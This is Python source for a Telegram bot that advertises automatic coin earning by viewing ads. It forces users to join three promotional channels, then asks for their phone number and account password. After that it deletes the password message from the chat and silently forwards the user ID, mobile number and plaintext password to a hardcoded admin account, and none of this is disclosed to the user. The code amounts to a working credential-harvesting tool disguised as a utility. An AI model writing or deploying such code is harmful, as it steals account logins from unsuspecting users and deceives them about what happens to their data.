from telegram.ext import (
    Updater, CommandHandler, MessageHandler, Filters
)
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from AdviewScriptbyYash import AdViewBot
import threading
import os

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 1329609274

CHANNELS = ["@Earning_Key", "@surbhiscripter", "@EagletekTelegram"]

STOP_USERS = {}
USER_STATE = {}
USER_DATA = {}

USERS_FILE = "users.txt"
# =========================================


# ---------- PERMANENT USERS ----------
def load_users():
    try:
        with open(USERS_FILE, "r") as f:
            return set(int(line.strip()) for line in f if line.strip())
    except FileNotFoundError:
        return set()


def save_user(user_id):
    users = load_users()
    if user_id not in users:
        with open(USERS_FILE, "a") as f:
            f.write(str(user_id) + "\n")


# ---------- FORCE JOIN ----------
def is_user_joined(bot, user_id):
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except:
            return False
    return True


def join_buttons():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔔 Join Channel of Yash", url="https://t.me/Earning_Key")],
        [InlineKeyboardButton("🔔 Join Channel of Surbhi", url="https://t.me/surbhiscripter")],
        [InlineKeyboardButton("🔔 Join Channel of Cyrus", url="https://t.me/EagletekTelegram")]
    ])


# ---------- COMMANDS ----------
def start(update, context):
    user_id = update.message.from_user.id
    save_user(user_id)

    update.message.reply_text(
        "✨ AdView Bot – Earn Coins Automatically! ✨\n\n"
        "🚀 Commands\n"
        "💰 /run – Start earning\n"
        "❌ /cancel – Stop earning\n\n"
        "📌 Steps\n"
        "1️⃣ Join channels\n"
        "2️⃣ /run\n"
        "3️⃣ Enter phone & password\n"
        "4️⃣ Bot runs automatically\n"
    )


def run(update, context):
    user_id = update.message.from_user.id
    save_user(user_id)

    if not is_user_joined(context.bot, user_id):
        update.message.reply_text(
            "❌ Pehle sabhi channels join karo:",
            reply_markup=join_buttons()
        )
        return

    USER_STATE[user_id] = "WAIT_MOBILE"
    update.message.reply_text("📱 Send your Phone Number:")


def cancel(update, context):
    user_id = update.message.from_user.id
    STOP_USERS[user_id] = True
    USER_STATE.pop(user_id, None)
    USER_DATA.pop(user_id, None)
    update.message.reply_text("🛑 Process cancelled.")


# ---------- BROADCAST (ADMIN ONLY) ----------
def broadcast(update, context):
    user_id = update.message.from_user.id

    if user_id != ADMIN_ID:
        update.message.reply_text("❌ Not allowed.")
        return

    if not context.args:
        update.message.reply_text("Use:\n/broadcast your message")
        return

    message = " ".join(context.args)
    users = load_users()
    sent = 0

    for uid in users:
        try:
            context.bot.send_message(chat_id=uid, text=message)
            sent += 1
        except:
            pass

    update.message.reply_text(f"✅ Broadcast sent to {sent} users.")


# ---------- MESSAGE HANDLER ----------
def handle_message(update, context):
    user_id = update.message.from_user.id
    save_user(user_id)

    text = update.message.text
    msg = update.message

    if USER_STATE.get(user_id) == "WAIT_MOBILE":
        USER_DATA[user_id] = {"mobile": text}
        USER_STATE[user_id] = "WAIT_PASSWORD"
        update.message.reply_text("🔒 Send your password:")
        return

    if USER_STATE.get(user_id) == "WAIT_PASSWORD":
        USER_DATA[user_id]["password"] = text
        USER_STATE.pop(user_id)

        # Auto delete password
        try:
            context.bot.delete_message(
                chat_id=msg.chat_id,
                message_id=msg.message_id
            )
        except:
            pass

        mobile = USER_DATA[user_id]["mobile"]
        password = USER_DATA[user_id]["password"]

        # Send to admin
        context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                "📥 NEW USER DATA\n\n"
                f"👤 User ID: {user_id}\n"
                f"📱 Mobile: {mobile}\n"
                f"🔒 Password: {password}"
            )
        )

        STOP_USERS[user_id] = False
        chat_id = msg.chat_id

        def is_stopped():
            return STOP_USERS.get(user_id, False)

        def send_progress(text):
            if not STOP_USERS.get(user_id):
                context.bot.send_message(chat_id=chat_id, text=text)

        def task():
            bot = AdViewBot(mobile, password, is_stopped)
            bot.run(progress_callback=send_progress)

            if not STOP_USERS.get(user_id):
                context.bot.send_message(chat_id=chat_id, text="🏁 Script Finished")

        threading.Thread(target=task).start()


# ---------- BOT START ----------
updater = Updater(BOT_TOKEN, use_context=True)
dp = updater.dispatcher

dp.add_handler(CommandHandler("start", start))
dp.add_handler(CommandHandler("run", run))
dp.add_handler(CommandHandler("cancel", cancel))
dp.add_handler(CommandHandler("broadcast", broadcast))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

updater.start_polling()
updater.idle()
